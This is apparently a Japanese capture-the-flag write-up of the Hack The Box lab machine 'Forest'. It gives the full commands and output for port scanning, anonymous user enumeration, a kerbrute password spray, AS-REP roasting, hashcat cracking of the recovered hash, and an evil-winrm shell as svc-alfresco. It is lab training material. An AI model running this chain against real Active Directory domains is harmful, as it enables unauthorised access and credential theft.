# Recon

```
nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.10.161
...
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-10-14 04:40:40Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49706/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49960/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
...
```
`rpcclient`をパスワード無しで実行する：

```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
...
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```
（この情報は`enum4linux`で出力される`enum4linux -a -M -l -d 10.10.10.161`）

上記の結果より以下のようにユーザリストを作る：


```
┌──(shoebill㉿shoebill)-[~/Forest_10.10.10.161]
└─$ cat users.txt
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

# initial shell

joeアカウントがいるか確認しようと`kerbrute`を走らせたら、ユーザsvc-alfrescoにAS-REP Roastingの攻撃ができることが判明：

```
┌──(shoebill㉿shoebill)-[~/Forest_10.10.10.161]
└─$ kerbrute passwordspray -v --user-as-pass --dc 10.10.10.161 -d htb.local users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/14/22 - Ronnie Flathers @ropnop

2022/10/14 13:59:08 >  Using KDC(s):
2022/10/14 13:59:08 >  	10.10.10.161:88

2022/10/14 13:59:09 >  [!] svc-alfresco@htb.local:svc-alfresco - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
2022/10/14 13:59:09 >  [!] santi@htb.local:santi - Invalid password
2022/10/14 13:59:09 >  [!] mark@htb.local:mark - Invalid password
...
```
そこでimpacketのGetNPUsers.pyを実行しsvc-alfrescoのハッシュを得る：
```
┌──(shoebill㉿shoebill)-[~/Forest_10.10.10.161]
└─$ impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb.local/svc-alfresco
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:dd570d12f7405838482c909d700d329c$bec2201781f29c5b9c4aa1c0b15bfeadb1f3cd2bbd99696f123a046388796ee0384d83e588c5331f9aed840b7d98f55126b5ab763df5c375cc9142198df04dcc967a62c94946ab10afa47c3b0296b15e9bbf4c5c2c976b1d7eba2f2a76cac589e307362c758abbf41a603270af48de36f0080be00304397105141362a2fd9f9f455658042a53830d55b2136dc1ffcb323cbec0d9f94a5cd13b9e033a80cfc954900ea74b9fd0ced11d0b73ae03bc6e18912501f9f7abe8bcaaeb1014875a3da34d7f50130c50edd461883f1191c45a0d9af68c5c6f1af828c87f25e7777f85cc591745ecbb47
```
これをtgt-hash.txtというファイル名で保存し、hashcatでクラックする：

```
┌──(shoebill㉿shoebill)-[~/Forest_10.10.10.161]
└─$ hashcat -a 0 -m 18200 tgt-hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.5) starting
...
$krb5asrep$23$svc-alfresco@HTB.LOCAL:dd5...b47:s3rvice
                                                          
Session..........: hashcat
Status...........: Cracked
...
```
これよりsvc-alfrescoのパスワードはs3rviceと判明。

このクリデンシャルを使って`evil-winrm`を実行しsvc-alfrescoのシェルを得る：

```

┌──(shoebill㉿shoebill)-[~/Forest_10.10.10.161]
└─$ evil-winrm --ip 10.10.10.161 -u svc-alfresco -p s3rvice                                                                                                                                                     1 ⨯
...
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
```


